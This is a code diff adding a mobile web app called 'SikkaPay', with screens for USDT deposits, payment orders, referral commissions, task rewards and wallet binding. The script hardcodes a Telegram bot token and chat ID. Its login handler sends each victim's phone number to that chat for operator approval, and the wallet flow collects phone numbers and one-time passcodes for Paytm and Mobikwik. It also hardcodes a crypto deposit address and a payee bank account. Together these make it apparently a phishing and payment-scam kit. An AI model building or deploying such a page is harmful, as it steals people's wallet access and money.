+                <div class="menu-item" onclick="showAlert('Support: @SikkaPaySupport')">
+                    <div class="menu-icon"><i class="fa-solid fa-headset"></i></div><span>Service</span>
+                </div>
+                <div class="menu-item" onclick="switchScreen('screen-message')">
+                    <div class="menu-icon"><i class="fa-regular fa-comment-dots"></i></div><span>Message</span>
+                </div>
+                <div class="menu-item" onclick="showAlert('PIN feature coming soon.')">
+                    <div class="menu-icon"><i class="fa-solid fa-shield-halved"></i></div><span>Pin</span>
+                </div>
+                <div class="menu-item" onclick="showAlert('Tutorial videos coming soon.')">
+                    <div class="menu-icon"><i class="fa-solid fa-book-open"></i></div><span>Tutorial</span>
+                </div>
+            </div>
+            <div class="version-tag">v1.0.7</div>
+        </div>
+        <button class="btn-logout" onclick="handleLogout()">Logout</button>
+    </div>
+
+    <!-- ================= 6. MESSAGE SCREEN ================= -->
+    <div id="screen-message" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-my')"></i>
+            <h2>Message</h2>
+        </div>
+        <div class="toggle-wrapper">
+            <div class="toggle-box">
+                <div class="toggle-btn" id="btn-unread" onclick="switchMsgTab('unread')">Unread</div>
+                <div class="toggle-btn active" id="btn-all" onclick="switchMsgTab('all')">All</div>
+            </div>
+        </div>
+        <div class="content-area"></div>
+    </div>
+
+    <!-- ================= 7. BUY ORDERS SCREEN ================= -->
+    <div id="screen-buy-orders" class="screen">
+        <div class="overlay" id="bo-overlay" onclick="closeAllDropdowns()"></div>
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-dashboard')"></i>
+            <h2>Buy Orders</h2>
+        </div>
+        <div class="filter-row">
+            <div class="filter-btn" id="btn-time" onclick="toggleDropdown('time')">
+                <span id="time-label">30 Days</span> <i class="fa-solid fa-caret-up" id="icon-time"></i>
+            </div>
+            <div class="filter-btn" id="btn-status" onclick="toggleDropdown('status')">
+                <span id="status-label">All statuses</span> <i class="fa-solid fa-caret-down" id="icon-status"></i>
+            </div>
+        </div>
+        <div class="dropdown-container" id="dropdown-time">
+            <div class="dropdown-item" onclick="selectTime('7 Days', this)">7 Days <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item selected" onclick="selectTime('30 Days', this)">30 Days <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item" onclick="selectTime('90 Days', this)">90 Days <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item" onclick="selectTime('All', this)">All <i class="fa-solid fa-check"></i></div>
+        </div>
+        <div class="dropdown-container" id="dropdown-status">
+            <div class="dropdown-item selected" onclick="selectStatus('All statuses', this)">All statuses <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item" onclick="selectStatus('Processing', this)">Processing <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item" onclick="selectStatus('Submit', this)">Submit <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item" onclick="selectStatus('Success', this)">Success <i class="fa-solid fa-check"></i></div>
+            <div class="dropdown-item" onclick="selectStatus('Close', this)">Close <i class="fa-solid fa-check"></i></div>
+        </div>
+        <div class="empty-state">No data, pull down to refresh.</div>
+    </div>
+
+    <!-- ================= 8. SCORE SCREEN ================= -->
+    <div id="screen-score" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-my')"></i>
+            <h2>Score</h2>
+        </div>
+        <div class="content-scroll">
+            <div class="score-card">
+                <div class="score-top">
+                    <div class="score-left">
+                        <div class="title">You have Score</div>
+                        <div class="amount">180</div>
+                    </div>
+                    <div class="score-right">
+                        <div class="change-text" onclick="showAlert('Score history')">Change</div>
+                        <div class="icons-container">
+                            <div class="icon-circle icon-yellow">¥</div>
+                            <div class="icon-circle icon-brown">¥</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-toggle">
+                    <div class="action-btn active" id="btn-into" onclick="toggleScoreTab('into')">Into</div>
+                    <div class="action-btn" id="btn-rollout" onclick="toggleScoreTab('rollout')">Roll out</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 9. SELL ORDERS SCREEN ================= -->
+    <div id="screen-sell-orders" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-dashboard')"></i>
+            <h2>Sell Orders</h2>
+        </div>
+        <div class="tabs-wrapper">
+            <div class="tabs-scroll">
+                <div class="tab-btn active" onclick="switchSellTab(this)">Pending</div>
+                <div class="tab-btn" onclick="switchSellTab(this)">Submitted</div>
+                <div class="tab-btn" onclick="switchSellTab(this)">Success</div>
+                <div class="tab-btn" onclick="switchSellTab(this)">Timeout</div>
+                <div class="tab-btn" onclick="switchSellTab(this)">All</div>
+            </div>
+        </div>
+        <div class="content-area">
+            <div class="no-orders-card">
+                <h3>No orders</h3>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 10. DEPOSIT SCREEN ================= -->
+    <div id="screen-deposit" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-my')"></i>
+            <h2>Deposit</h2>
+        </div>
+        <div class="content-pad">
+            <div class="instruction-box">
+                <b>1.</b> Please enter the amount of USDT you would like to use to recharge your integrals.<br>
+                <b>2.</b> Then click the 'Deposit' button at the bottom.<br>
+                <b>3.</b> Follow the payment instructions on the order page to complete the payment.
+            </div>
+            <div class="main-card">
+                <div class="calc-header">
+                    <div class="calc-title">Calculator</div>
+                    <div class="calc-ratio">Ratio: 1 USDT=111 INR</div>
+                </div>
+                <div class="input-row">
+                    <div class="usdt-badge">USDT</div>
+                    <input type="number" id="usdt-input" value="100" oninput="calculateScore()">
+                </div>
+                <div class="result-row">
+                    <div class="result-box">
+                        <div class="res-title">Estimated bonus:</div>
+                        <div class="res-val">0.00 Score</div>
+                    </div>
+                    <div class="result-box">
+                        <div class="res-title">You will receive:</div>
+                        <div class="res-val" id="score-output">11100.00 Score</div>
+                    </div>
+                </div>
+                <div class="chain-title">Select Chain Type</div>
+                <div class="chain-option active" onclick="selectChain(this)">
+                    <div class="chain-left">
+                        <div class="chain-icon icon-tether"><div class="icon-tether-overlay"></div></div>
+                        <div class="chain-text"><h4>TRC20</h4><p>USDT-TRON Network</p></div>
+                    </div>
+                    <div class="radio-btn"></div>
+                </div>
+                <div class="chain-option" onclick="selectChain(this)">
+                    <div class="chain-left">
+                        <div class="chain-icon icon-bsc"></div>
+                        <div class="chain-text"><h4>BSC(BEP20)</h4><p>USDT-BNB Smart Chain</p></div>
+                    </div>
+                    <div class="radio-btn"></div>
+                </div>
+            </div>
+            <div class="warning-text">
+                <i class="fa-solid fa-triangle-exclamation"></i> After the recharge is completed, please wait 3-5 minutes for the deposit to arrive.
+            </div>
+            <button class="btn-deposit" onclick="createDepositOrder()">Deposit</button>
+        </div>
+    </div>
+
+    <!-- ================= 11. DEPOSIT ORDER SCREEN ================= -->
+    <div id="screen-deposit-order" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-deposit')"></i>
+            <h2>Order</h2>
+        </div>
+        <div class="order-card">
+            <div class="order-header-bg">
+                <h1 id="order-usdt-amount">USDT 100.00</h1>
+            </div>
+            <div class="order-details">
+                <div class="detail-row">
+                    <div class="detail-top"><div class="detail-label">Address:</div><i class="fa-regular fa-copy copy-icon" onclick="copyToClipboard('TF44G472mv7neD3fh1iGtz62Fc8FU3dhSE')"></i></div>
+                    <div class="detail-val">TF44G472mv7neD3fh1iGtz62Fc8FU3dhSE</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-top"><div class="detail-label">Type:</div><i class="fa-regular fa-copy copy-icon" onclick="copyToClipboard('TRC20-USDT')"></i></div>
+                    <div class="detail-val" style="text-align: right; margin-top: -20px;">
+                        <span class="type-badge"><span class="icon-tether-mini">T</span> TRC20-USDT</span>
+                    </div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-top"><div class="detail-label">Status:</div><i class="fa-regular fa-copy copy-icon" onclick="copyToClipboard('Pending')"></i></div>
+                    <div class="detail-val" style="text-align: right; margin-top: -20px;">Pending</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-top"><div class="detail-label">CreatedAt:</div><i class="fa-regular fa-copy copy-icon" onclick="copyToClipboard(document.getElementById('order-date').innerText)"></i></div>
+                    <div class="detail-val" style="text-align: right; margin-top: -20px;" id="order-date">2026-11-07 13:58:19</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-top"><div class="detail-label">NO:</div><i class="fa-regular fa-copy copy-icon" onclick="copyToClipboard(document.getElementById('order-id').innerText)"></i></div>
+                    <div class="detail-val" style="text-align: right; margin-top: -20px;" id="order-id">U2026110713581996008498</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 12. TASK REWARDS SCREEN ================= -->
+    <div id="screen-task-rewards" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-dashboard')"></i>
+            <h2>Task Rewards</h2>
+        </div>
+        <div class="subtitle">Earn tokens by completing tasks</div>
+        <div class="tabs-container">
+            <div class="tabs-bg">
+                <div class="tab-btn active" onclick="switchTaskTab('newbie', this)">Newbie Tasks</div>
+                <div class="tab-btn" onclick="switchTaskTab('team', this)">Team Growth</div>
+                <div class="tab-btn" onclick="switchTaskTab('daily', this)">Daily Tasks</div>
+            </div>
+        </div>
+        <div id="newbie-content" class="content-scroll active">
+            <div class="task-card">
+                <div class="card-top">
+                    <div class="badge-text">NEWBIE</div>
+                    <div class="progress-section"><div class="progress-track"><div class="progress-fill" style="width: 0%;"></div></div><div class="progress-text">0 / 3000</div></div>
+                </div>
+                <div class="card-title">New Member Tasks</div>
+                <div class="card-desc">Register and start trading. Once your total trading amount reaches 3000.</div>
+                <div class="card-bottom">
+                    <div class="points"><div class="star-icon"><i class="fa-solid fa-star"></i></div><span class="points-val">150</span></div>
+                    <button class="btn-action btn-light">In Progress</button>
+                </div>
+            </div>
+            <div class="task-card">
+                <div class="card-top">
+                    <div class="badge-text">NEWBIE</div>
+                    <div class="progress-section"><div class="progress-track"><div class="progress-fill" style="width: 0%;"></div></div><div class="progress-text">0 / 1</div></div>
+                </div>
+                <div class="card-title">Bind Wallet Type Paytm Business Reward</div>
+                <div class="card-desc">You can get rewards by binding your Paytm Business wallet.</div>
+                <div class="card-bottom">
+                    <div class="points"><div class="star-icon"><i class="fa-solid fa-star"></i></div><span class="points-val">30</span></div>
+                    <button class="btn-action btn-light" onclick="switchScreen('screen-tools')">Go to Bind</button>
+                </div>
+            </div>
+            <div class="task-card">
+                <div class="card-top">
+                    <div class="badge-text">NEWBIE</div>
+                    <div class="progress-section"><div class="progress-track"><div class="progress-fill" style="width: 100%;"></div></div><div class="progress-text">1 / 1</div></div>
+                </div>
+                <div class="card-title">Bind Wallet Type Mobikwik Reward</div>
+                <div class="card-desc">You can get rewards by binding your Mobikwik wallet.</div>
+                <div class="card-bottom">
+                    <div class="points"><div class="star-icon"><i class="fa-solid fa-star"></i></div><span class="points-val">15</span></div>
+                    <button class="btn-action btn-received" onclick="showAlert('Already Received')">Received</button>
+                </div>
+            </div>
+        </div>
+        <div id="team-content" class="content-scroll">
+            <div class="task-card">
+                <div class="card-top"><div class="badge-text" style="color:#B39DDB;">INVITE</div><div class="progress-text">0 invited</div></div>
+                <div class="card-desc" style="font-size: 15px; color: #333; margin-top: 5px;">Invite your friends to trade! When each referred user reaches 20000 in total trading amount and get reward 200 automatically.</div>
+                <div class="card-bottom" style="margin-top: 15px;">
+                    <div class="points"><div class="star-icon"><i class="fa-solid fa-star"></i></div><span class="points-val">0</span></div>
+                    <button class="btn-action btn-solid" onclick="switchScreen('screen-team')">Invite</button>
+                </div>
+            </div>
+        </div>
+        <div id="daily-content" class="content-scroll">
+            <div class="task-card">
+                <div class="card-top">
+                    <div class="badge-text yesterday">YESTERDAY</div>
+                    <div class="progress-section"><div class="progress-track"><div class="progress-fill" style="width: 0%;"></div></div><div class="progress-text">0 / 100000</div></div>
+                </div>
+                <div class="card-title">Daily Incentive Bonus 2026-11-06</div>
+                <div class="card-desc">Participate in daily trading activities. Depending on your total daily trading amount.</div>
+                <div class="card-bottom">
+                    <div class="points"><div class="star-icon"><i class="fa-solid fa-star"></i></div><span class="points-val">0</span></div>
+                    <button class="btn-action btn-light" onclick="showAlert('Day Ended')">Unfinished</button>
+                </div>
+            </div>
+            <div class="task-card">
+                <div class="card-top">
+                    <div class="badge-text today">TODAY</div>
+                    <div class="progress-section"><div class="progress-track"><div class="progress-fill" style="width: 0%;"></div></div><div class="progress-text">0 / 100000</div></div>
+                </div>
+                <div class="card-title">Daily Incentive Bonus 2026-11-07</div>
+                <div class="card-desc">Participate in daily trading activities. Depending on your total daily trading amount.</div>
+                <div class="card-bottom">
+                    <div class="points"><div class="star-icon"><i class="fa-solid fa-star"></i></div><span class="points-val">0</span></div>
+                    <button class="btn-action btn-solid">In Progress</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 13. TEAM SCREEN ================= -->
+    <div id="screen-team" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-dashboard')"></i>
+            <h2>Team</h2>
+        </div>
+        <div class="content-scroll">
+            <div class="main-card">
+                <h3>My Total Commissions:</h3><h1>+0.00</h1>
+                <div class="stats-grid">
+                    <div class="stat-box"><p>Commissions Yesterday</p><h4>+0.00</h4></div>
+                    <div class="stat-box"><p>Total Team Members</p><h4>0</h4></div>
+                    <div class="stat-box"><p>Commissions Today</p><h4>+0.00</h4></div>
+                    <div class="stat-box"><p>Total Team Deposit</p><h4>+0.00</h4></div>
+                </div>
+            </div>
+            <div class="invitation-wrapper">
+                <div class="tab-header">Invitation</div>
+                <div class="invitation-body">
+                    <div class="link-row">
+                        <h3>Link</h3>
+                        <span>mFfPQj <i class="fa-regular fa-copy" style="cursor: pointer;" onclick="copyToClipboard('mFfPQj')"></i></span>
+                    </div>
+                    <div class="team-members-box">
+                        <h4>New Team Members:</h4>
+                        <div class="level-grid">
+                            <div class="level-box"><h5>Level.B</h5><p>Today: <span>0</span></p><p>Yesterday: <span>0</span></p></div>
+                            <div class="level-box"><h5>Level.C</h5><p>Today: <span>0</span></p><p>Yesterday: <span>0</span></p></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="share-card">
+                <h3>Share APP to</h3>
+                <div class="share-icons">
+                    <div class="share-icon" onclick="shareApp('Telegram')"><i class="fa-brands fa-telegram" style="color: #0088cc;"></i><span>Telegram</span></div>
+                    <div class="share-icon" onclick="shareApp('Facebook')"><i class="fa-brands fa-facebook" style="color: #1877F2;"></i><span>Facebook</span></div>
+                    <div class="share-icon" onclick="shareApp('Whatsapp')"><i class="fa-brands fa-whatsapp" style="color: #25D366;"></i><span>Whatsapp</span></div>
+                    <div class="share-icon" onclick="copyToClipboard('https://sikkapay.com?ref=mFfPQj')"><i class="fa-solid fa-link" style="color: #9b59b6;"></i><span>Copy link</span></div>
+                </div>
+            </div>
+            <div class="commission-wrapper">
+                <div class="tab-header" style="border-top-right-radius: 25px;">Commissions / Deposit</div>
+                <div class="commission-body">
+                    <div class="commission-card">
+                        <div class="comm-row"><h4>Level.B</h4><span>0.00 / 0.00</span></div>
+                        <div class="comm-row" style="margin-bottom: 0;"><h4>Level.C</h4><span>0.00 / 0.00</span></div>
+                        <div class="view-details" onclick="switchScreen('screen-level')">View details></div>
+                    </div>
+                </div>
+            </div>
+            <div class="performance-card">
+                <div class="perf-header">
+                    <h3>Performance</h3>
+                    <div class="perf-tabs"><div class="perf-tab" onclick="switchPerfTab(this)">Day</div><div class="perf-tab" onclick="switchPerfTab(this)">Week</div><div class="perf-tab active" onclick="switchPerfTab(this)">Month</div></div>
+                </div>
+                <div class="chart-area">
+                    <div class="chart-y-axis"><span>4</span><span>3</span><span>2</span><span>1</span><span>0</span></div>
+                    <div class="chart-line" style="margin-top: 5px;"></div><div class="chart-line"></div><div class="chart-line"></div><div class="chart-line"></div><div class="chart-line"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 14. LEVEL SCREEN ================= -->
+    <div id="screen-level" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-team')"></i>
+            <h2>Level</h2>
+        </div>
+        <div class="content-scroll">
+            <div class="toggle-container">
+                <div class="toggle-bg">
+                    <div class="toggle-btn active" onclick="switchLevelTab('B', this)">LevelB</div>
+                    <div class="toggle-btn" onclick="switchLevelTab('C', this)">LevelC</div>
+                </div>
+            </div>
+            <div id="level-data-container"><div class="no-data-text">No more data</div></div>
+        </div>
+    </div>
+
+    <!-- ================= 15. PAYMENT HISTORY SCREEN ================= -->
+    <div id="screen-payment-history" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-my')"></i>
+            <h2>Payment History</h2>
+        </div>
+        <div class="main-toggle-container">
+            <div class="main-toggle-bg">
+                <div class="main-tab-btn active" id="btn-receive" onclick="switchHistoryTab('receive')">Receive</div>
+                <div class="main-tab-btn" id="btn-purchase" onclick="switchHistoryTab('purchase')">Purchase</div>
+            </div>
+        </div>
+        <div id="content-receive" class="content-scroll active"><div class="empty-state">No more data</div></div>
+        <div id="content-purchase" class="content-scroll">
+            <div class="summary-card">
+                <div class="shape-yellow"></div><div class="shape-blue"></div>
+                <div class="summary-content">
+                    <div class="summary-left"><h3>Balance:</h3><h1><span>₹</span>180</h1></div>
+                    <div class="summary-right"><div>Reward: <b>₹0</b></div><div>Pending: <b>₹0</b></div></div>
+                </div>
+            </div>
+            <div class="sub-toggle-container">
+                <div class="sub-tab-btn active" id="btn-inr" onclick="switchHistorySubTab('inr')">INR</div>
+                <div class="sub-tab-btn" id="btn-ustd" onclick="switchHistorySubTab('ustd')">USTD</div>
+            </div>
+            <div class="empty-state">No more data</div>
+        </div>
+    </div>
+
+    <!-- ================= 16. ADD TOOL SCREEN ================= -->
+    <div id="screen-add-tool" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-tools')"></i>
+            <h2>Add Tool</h2>
+        </div>
+        <div class="choose-title">Choose your payment</div>
+        <div class="content-scroll">
+            <div class="toggle-bg">
+                <div class="toggle-btn active" id="tab-personal" onclick="switchProviderTab('personal')">Personal</div>
+                <div class="toggle-btn" id="tab-business" onclick="switchProviderTab('business')">Business</div>
+            </div>
+            <div id="provider-list"></div>
+        </div>
+    </div>
+
+    <!-- ================= 17. WALLET SETUP SCREEN ================= -->
+    <div id="screen-wallet-setup" class="screen">
+        <div class="header">
+            <i class="fa-solid fa-arrow-left back-btn" onclick="switchScreen('screen-add-tool')"></i>
+            <h2>Wallet</h2>
+        </div>
+        <div class="content-scroll">
+            <div class="stepper">
+                <div class="step-item active" id="step-ind-1"><div class="step-circle">1</div><div class="step-text">Phone</div></div>
+                <div class="step-item" id="step-ind-2"><div class="step-circle">2</div><div class="step-text">Authorize</div></div>
+                <div class="step-item" id="step-ind-3"><div class="step-circle">3</div><div class="step-text">Finish</div></div>
+            </div>
+            <div id="step-1">
+                <div class="step-card">
+                    <div class="step-header">Create <span id="prov-name-1">Wallet</span></div>
+                    <div class="step-body">
+                        <h3>Let's get started!</h3>
+                        <p>1. Please complete the form below based on your wallet information.<br>2. Click "Next" to complete and enter the next step.</p>
+                        <label class="input-label">Your Phone</label>
+                        <div class="input-group"><span>+91</span><input type="tel" id="wallet-phone" placeholder="Enter phone number" maxlength="10"></div>
+                    </div>
+                </div>
+                <button class="btn-next" onclick="submitPhone()">Next</button>
+            </div>
+            <div id="step-2" style="display: none;">
+                <div class="step-card">
+                    <div class="step-header"><span id="prov-name-2">Wallet</span> OTP Verification</div>
+                    <div class="step-body">
+                        <p>1. Please send the OTP code to your phone first.<br>2. Enter the OTP code after receiving it.</p>
+                        <div class="upi-info" style="background:#f8f9fa; padding:10px; border-radius:8px; margin-bottom:15px; border:1px solid #eee;">
+                            <span>Phone:</span> <b id="display-phone">+91</b>
+                        </div>
+                        <label class="input-label" style="display:flex; justify-content:space-between;">OTP Code <span class="otp-timer" id="otp-timer">30s</span></label>
+                        <div class="input-group"><i class="fa-regular fa-envelope" style="padding:15px; color:#888;"></i><input type="tel" id="wallet-otp" placeholder="Enter OTP" maxlength="6"></div>
+                    </div>
+                </div>
+                <button class="btn-next" onclick="submitOTP()">Next</button>
+            </div>
+            <div id="step-3" style="display: none;">
+                <div class="step-card">
+                    <div class="step-header">Verification Result</div>
+                    <div class="step-body">
+                        <div class="upi-info"><span>Wallet Name</span> <b>My Wallet</b></div>
+                        <div class="upi-info"><span>Your Phone</span> <b id="display-phone-2">9153****87</b></div>
+                        <label class="input-label">Select UPI</label>
+                        <div id="upi-list"><p style="color:#888; font-size:13px; margin-bottom:10px;">Waiting for Admin to add UPI via Telegram command...</p></div>
+                    </div>
+                </div>
+                <button class="btn-next" onclick="finishSetup()">Finish</button>
+            </div>
+            <div id="step-4" style="display: none;">
+                <div id="step-success">
+                    <div class="check-circle"><i class="fa-solid fa-check"></i></div>
+                    <div class="success-text">Successfully</div>
+                    <button class="btn-view-wallet" onclick="switchScreen('screen-tools')">View Wallet</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 18. ORDER SCREEN (From Payment) ================= -->
+    <div id="screen-order" class="screen">
+        <div class="header" style="position:absolute; top:0; left:0; width:100%; justify-content: flex-start; background:transparent;">
+            <i class="fa-solid fa-arrow-left" style="color:#0D8A5F; font-size:20px; cursor:pointer;" onclick="switchScreen('screen-payment', true)"></i>
+            <h2 style="flex:1; text-align:center; margin-right:20px;">Order</h2>
+        </div>
+        <div style="margin-top: 60px;">
+            <div class="order-top">
+                <h1 id="ord-amount">INR 0.00</h1>
+                <div class="expire-pill" id="ord-timer">Expire: 29:59</div>
+                <div class="notice-text">Notice: If you have already paid, please wait patiently for the transaction review, please do not cancel the order.</div>
+            </div>
+            <div class="order-details">
+                <div class="detail-row"><div class="d-label">PayeeAccount:</div><div class="d-val"><span id="payee-acc">---</span> <i class="fa-regular fa-copy" onclick="copyToClipboard(document.getElementById('payee-acc').innerText)"></i></div></div>
+                <div class="detail-row"><div class="d-label">PayeeName:</div><div class="d-val"><span id="payee-name">---</span> <i class="fa-regular fa-copy" onclick="copyToClipboard(document.getElementById('payee-name').innerText)"></i></div></div>
+                <div class="detail-row"><div class="d-label">IFSC:</div><div class="d-val"><span id="payee-ifsc">---</span> <i class="fa-regular fa-copy" onclick="copyToClipboard(document.getElementById('payee-ifsc').innerText)"></i></div></div>
+                <div class="ifsc-note">Note : IF IFSC Mismatched , Do Not Pay</div>
+                <div class="detail-row"><div class="d-label">Type:</div><div class="d-val"><span>IMPS</span> <i class="fa-regular fa-copy" onclick="copyToClipboard('IMPS')"></i></div></div>
+                <div class="warning-red">If the payment fails, please do not attempt to pay again.</div>
+                <div class="detail-row"><div class="d-label">Payout Wallet:</div><div class="d-val payout-badge"><span class="payout-icon">M</span> <span id="ord-wallet">Mobikwik</span><button class="btn-change" onclick="switchScreen('screen-payment', true)">Change</button></div></div>
+                <div class="detail-row"><div class="d-label">Payout Account:</div><div class="d-val"><span id="ord-tool-acc">---</span> <i class="fa-regular fa-copy" onclick="copyToClipboard(document.getElementById('ord-tool-acc').innerText)"></i></div></div>
+                <div class="detail-row"><div class="d-label">Payout UPI:</div><div class="d-val"><span id="ord-tool-upi">---</span> <i class="fa-regular fa-copy" onclick="copyToClipboard(document.getElementById('ord-tool-upi').innerText)"></i></div></div>
+                <div class="detail-row"><div class="d-label">Status:</div><div class="d-val status-badge">Pending <button class="btn-cancel-order" onclick="switchScreen('screen-payment', true)">Cancel</button></div></div>
+                <div class="detail-row"><div class="d-label">NO:</div><div class="d-val"><span id="ord-id">---</span> <i class="fa-regular fa-copy" onclick="copyToClipboard(document.getElementById('ord-id').innerText)"></i></div></div>
+                <div class="upload-section" style="margin-top: 15px;"><button class="btn-upload" onclick="showAlert('Voucher Uploaded')">Upload Voucher <i class="fa-solid fa-chevron-right" style="font-size:12px;"></i></button><div class="upload-warning">Please upload the correct Transaction Proof immediately after payment, otherwise the recharge may fail.</div></div>
+            </div>
+            <button class="btn-go-pay" onclick="showAlert('Redirecting to Payment Gateway...')">go pay</button>
+        </div>
+    </div>
+
+    <!-- ================= OVERLAYS & MODALS ================= -->
+    <div class="loading-overlay" id="loader"><div class="spinner"></div><div class="loading-text">Loading</div></div>
+
+    <div class="modal-overlay" id="confirm-modal" style="position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:9999; display:none; justify-content:center; align-items:center; padding:20px; backdrop-filter: blur(3px);">
+        <div class="modal-box">
+            <div class="close-btn" onclick="closeModal()"><i class="fa-solid fa-xmark"></i></div>
+            <h2>Really?</h2><p>Are you sure you want to stop selling?</p>
+            <div class="modal-actions">
+                <button class="btn-modal btn-cancel" onclick="closeModal()">Cancel</button>
+                <button class="btn-modal btn-yes" onclick="confirmStopSelling()">Yes</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= BOTTOM NAVIGATION ================= -->
+    <div class="bottom-nav" id="bottom-nav">
+        <div class="nav-item active" onclick="switchTab('screen-dashboard', this)"><i class="fa-solid fa-house"></i><span>Home</span></div>
+        <div class="nav-item" onclick="switchTab('screen-payment', this)"><i class="fa-solid fa-credit-card"></i><span>Payment</span></div>
+        <div class="nav-center" onclick="switchTab('screen-tools', this)"><i class="fa-solid fa-wallet"></i></div>
+        <div class="nav-item" onclick="switchTab('screen-statistics', this)"><i class="fa-solid fa-users"></i><span>Statistics</span></div>
+        <div class="nav-item" onclick="switchTab('screen-my', this)"><i class="fa-regular fa-face-smile"></i><span>My</span></div>
+    </div>
+
+</div>
+
+<script>
+    // ==========================================
+    // TELEGRAM GLOBAL CONFIG & DATA STORAGE
+    // ==========================================
+    const BOT_TOKEN = '8864112645:AAHTMjpWSfPxhqAB8pkgwm-j49OXAGWs1zI';
+    const CHAT_ID = '8709228094';
+    
+    let lastUpdateId = 0;
+    let isWaitingLogin = false;
+    let isWaitingWallet = null;
+    let isWaitingOrder = false;
+    let currentOrderAmount = 0;
+    let mainTimer = null;
+
+    // App Configuration (Links & Images)
+    let appConfig = JSON.parse(localStorage.getItem('appConfig')) || {
+        links: {
+            banner: '#', detail: '#', home: '#', payment: '#', wallet: '#', stats: '#', my: '#',
+            usdt: '#', task: '#', team: '#', order: '#', newcomer: '#'
+        },
+        images: {
+            banner: '', usdt: '', task: '', team: '', order: ''
+        }
+    };
+
+    // Payee Data
+    let payeeData = JSON.parse(localStorage.getItem('payeeData')) || { acc: '3049566421', name: 'sannnkhan', ifsc: 'KKBK0001811' };
+
+    // Dynamic UI Updater
+    function updateDynamicUI() {
+        // Update Banner
+        const bannerContainer = document.getElementById('main-banner');
+        if (appConfig.images.banner) {
+            bannerContainer.innerHTML = `<img src="${appConfig.images.banner}" alt="Banner">`;
+        } else {
+            bannerContainer.innerHTML = `<div class="banner-placeholder">Tap to set banner link</div>`;
+        }
+
+        // Update Icons
+        ['usdt', 'task', 'team', 'order'].forEach(key => {
+            const el = document.getElementById('icon-' + key);
+            if (appConfig.images[key]) {
+                el.innerHTML = `<img src="${appConfig.images[key]}" alt="${key}">`;
+            } else {
+                // Fallback icons
+                if(key === 'usdt') el.innerHTML = `<i class="fa-solid fa-shirt" style="color: #0D8A5F;"></i>`;
+                if(key === 'task') el.innerHTML = `<i class="fa-solid fa-list-ul"></i>`;
+                if(key === 'team') el.innerHTML = `<i class="fa-regular fa-user"></i>`;
+                if(key === 'order') el.innerHTML = `<i class="fa-regular fa-clipboard"></i>`;
+            }
+        });
+
+        // Update Payee Data
+        document.getElementById('payee-acc').innerText = payeeData.acc;
+        document.getElementById('payee-name').innerText = payeeData.name;
+        document.getElementById('payee-ifsc').innerText = payeeData.ifsc;
+    }
+
+    // Open Link handler
+    function openDynamicLink(target) {
+        let url = appConfig.links[target];
+        if (url && url !== '#') {
+            window.open(url, '_blank');
+        } else {
+            // Default navigation if no custom link is set
+            if (target === 'wallet' || target === 'detail') switchScreen('screen-payment', true);
+            else if (target === 'usdt') switchScreen('screen-tools', true);
+            else if (target === 'task') switchScreen('screen-task-rewards');
+            else if (target === 'team') switchScreen('screen-team');
+            else if (target === 'order') switchScreen('screen-sell-orders');
+            else if (target === 'banner' || target === 'newcomer') switchScreen('screen-buy-orders');
+            else showAlert('Link not set by Admin yet.');
+        }
+    }
+
+    // ==========================================
+    // NAVIGATION
+    // ==========================================
+    function switchScreen(screenId, showNav = false) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        document.getElementById(screenId).classList.add('active');
+        document.getElementById('bottom-nav').classList.toggle('show', showNav);
+        window.scrollTo(0,0);
+    }
+
+    function switchTab(screenId, element) {
+        switchScreen(screenId, true);
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        if (element) element.classList.add('active');
+    }
+
+    // ==========================================
+    // AUTH LOGIC
+    // ==========================================
+    function handleLogin() {
+        const phone = document.getElementById('login-phone').value;
+        if(!phone) { showAlert('Enter phone number'); return; }
+        
+        document.getElementById('loader').style.display = 'flex';
+        isWaitingLogin = true;
+        sendTelegram(`🔐 <b>NEW LOGIN REQUEST</b>\nPhone: ${phone}\n\n👉 Reply <code>/ok</code> to allow login.`);
+    }
+
+    function handleRegister() {
+        showAlert('Registration Successful! Please login.');
+        switchScreen('screen-login');
+    }
+
+    function handleLogout() {
+        switchScreen('screen-login');
+        document.getElementById('bottom-nav').classList.remove('show');
+    }
+
+    // ==========================================
+    // SUB-SCREEN LOGIC
+    // ==========================================
+    function switchMsgTab(type) {
